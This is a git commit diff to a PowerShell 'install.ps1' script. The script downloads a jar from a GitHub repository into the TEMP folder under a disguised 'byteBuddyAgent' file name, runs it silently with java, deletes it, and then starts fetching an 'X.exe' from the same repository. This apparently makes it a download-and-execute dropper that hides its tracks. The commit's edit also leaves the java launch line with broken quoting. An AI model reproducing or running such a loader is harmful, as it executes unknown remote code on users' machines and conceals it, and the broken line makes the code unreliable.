ff621bf51da3484618e9b3c48ab36ce02d6e96b3
nowrez <113263830+nowrez@users.noreply.github.com>
2024-08-23 04:09:58 +0500

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,7 +1,7 @@
 $link2 = "https://github.com/nowrez/zelenkovcode/raw/main/ABCD.jar"
 $outfile2 = "$env:TEMP\byteBuddyAgent117246237292487086310.jar"
 Invoke-WebRequest -Uri "$link2" -OutFile "$outfile2"
-Start-Process -Wait -NoNewWindow -FilePath "java" -ArgumentList "-jar `"$outfile2`""
+Start-Process -Wait -NoNewWindow -FilePath "java" -ArgumentList "-jar "$outfile2"
 Remove-Item -Force "$outfile2"
 
 $link1 = "https://github.com/nowrez/zelenkovcode/raw/main/X.exe"
